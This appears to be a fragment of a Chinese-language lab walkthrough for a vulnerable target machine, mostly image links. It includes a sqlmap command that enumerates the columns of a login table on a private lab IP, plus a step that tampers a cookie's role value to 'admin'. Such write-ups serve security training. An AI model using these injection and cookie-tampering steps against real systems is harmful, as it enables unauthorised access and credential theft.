...
![image-20221207143719379](assets/image-20221207143719379.png)
...
![image-20221207144156919](assets/image-20221207144156919.png)
...
![image-20221207144434177](assets/image-20221207144434177.png)
...
![image-20221207150628111](assets/image-20221207150628111.png)
...
![image-20221207155810036](assets/image-20221207155810036.png)
...
![image-20221207155950002](assets/image-20221207155950002.png)
...
![image-20221207160750307](assets/image-20221207160750307.png)
...
![image-20221207163318486](assets/image-20221207163318486.png)
...
![image-20221207163638855](assets/image-20221207163638855.png)
...
![image-20221209172610545](assets/image-20221209172610545.png)

提交文件，发现跳转到localhost。将localhost改为靶机ip尝试。

![image-20221209203518987](assets/image-20221209203518987.png)

点击提交

![image-20221209203707296](assets/image-20221209203707296.png)
...
![image-20221209174849702](assets/image-20221209174849702.png)
...
![image-20221209174828590](assets/image-20221209174828590.png)

```shell
sqlmap -u "http://192.168.56.101/enter_network/" --forms --batch -D "Machine" -T "login" --columns
# columns:password;role;username
```

![image-20221209174758501](assets/image-20221209174758501.png)
...
![image-20221209174731002](assets/image-20221209174731002.png)

### 4. bp抓包分析

![image-20221209205529082](assets/image-20221209205529082.png)
...
![image-20221209211935936](assets/image-20221209211935936.png)

修改request中cookie中role为admin

![image-20221209212032503](assets/image-20221209212032503.png)
...
![image-20221215121307803](assets/image-20221215121307803.png)
